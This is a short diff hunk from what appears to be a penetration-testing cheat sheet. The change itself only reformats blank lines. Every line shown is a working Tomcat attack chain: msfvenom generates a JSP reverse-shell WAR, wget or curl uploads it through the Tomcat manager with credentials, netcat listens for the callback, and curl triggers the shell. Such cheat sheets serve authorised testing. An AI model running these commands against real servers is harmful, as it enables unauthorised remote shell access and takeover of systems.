@@ -226,17 +226,17 @@
 	```
 	\# Generate payload
 	msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
-
+	\
 	\# Upload payload
 	Tomcat6 :
 	wget 'http://USER:PASSWORD@IP:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
-
+	\
 	Tomcat7 and above :
 	curl -v -u USER:PASSWORD -T shell.war 'http://IP:8080/manager/text/deploy?path=/shellh&update=true'
-
+	\
 	\# Listener
 	nc -nvlp PORT
-
+	\
 	\# Execute payload
 	curl http://IP:8080/shell/
 	```
